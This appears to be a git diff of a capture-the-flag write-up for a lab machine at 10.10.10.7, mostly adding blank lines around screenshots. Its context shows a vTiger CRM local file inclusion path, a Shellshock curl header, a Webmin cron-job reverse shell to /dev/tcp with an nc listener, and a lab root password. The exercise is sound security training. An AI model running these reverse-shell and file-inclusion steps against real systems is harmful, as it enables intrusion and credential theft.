@@ -66,6 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 389.49 seconds
 ```
 
 + Navigate to `https://10.10.10.7/`
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8826721d-9e43-4f19-a2fb-28bae559dd17)
 
 + Directory fuzzing:
@@ -113,15 +114,16 @@ Finished
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/837bed63-aab3-4ba3-a404-325c94c17739)
 
 + `searchsploit elastix`
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5a65eb4d-8714-475f-a9f6-9cae506cd456)
 
 + Navigate to `https://10.10.10.7/vtigercrm/`
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03b85b59-667c-43ca-b134-fc772537c2f8)
 
 + `searchsploit vtiger crm 5.1.0`
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a9470a5b-52e2-4d9b-a204-b7bc268f5ce8)
-
-
 
 
 ## Exploitation
@@ -136,6 +138,7 @@ https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/87307089-e37c-4265-8c39-915ac2a57034)
 
 + Users and passwords identified:
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/352c0043-3abf-48ff-bc04-d930166aa76f)
 
 + And also try:
@@ -146,7 +149,9 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5723c61c-8d7e-429e-862f-e94b5cbede3f)
 
 + **vTiger CRM 5.1.0 - Local File Inclusion:** [CVE-2012-4867](https://www.exploit-db.com/exploits/18770)
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a549bf30-1da5-4ba7-89ae-2534fbe28e5e)
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/232fb7bb-6a9f-4c13-851e-329aed2c0c3f)
 
 + Now there are enumerated users and passwords.
@@ -156,11 +161,13 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 + If meet an error, check [1](https://www.iclarified.com/85252/how-to-fix-no-matching-key-exchange-method-found-on-mac) [2](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)
 + Login `ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7`
 + Get root!
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)
 
 ### 2.Solution:
 + Navigate to `https://10.10.10.7:10000/` and try login: `admin`:`admin`
 + Failed attempt redirects `https://10.10.10.7:10000/session_login.cgi`
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6fa5ccff-6d76-417c-a1ed-aaa81fd351cd)
 
 + Check [Shellshock vulnerability](https://github.com/opsxcq/exploit-CVE-2014-6271): [CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)
@@ -171,19 +178,24 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 ```
 
 + Get root shell:
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27ac05b7-ad64-4ee1-9af6-012dc4b8b77a)
+
 
 ### 3.Solution:
 + Navigate to `https://10.10.10.7:10000/` and login webmin: `root`:`jEhdIekWmdjE`
 + Go to `System`->`Scheduled Cron Jobs`->`Create a new scheduled cron job.`
 + `bash -c 'bash -i >& /dev/tcp/10.10.14.18/5555 0>&1'`
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/414e50d8-13c0-4265-9709-885ffc6103f9)
 
 + Start listener: `nc -lnvp 5555`
 + Run Now:
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d084c449-d3b1-4446-90ce-96bb920ddd44)
 
 + Get root shell:
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/819decc1-3fb6-4d95-8915-6df5306f1a9f)
 
 
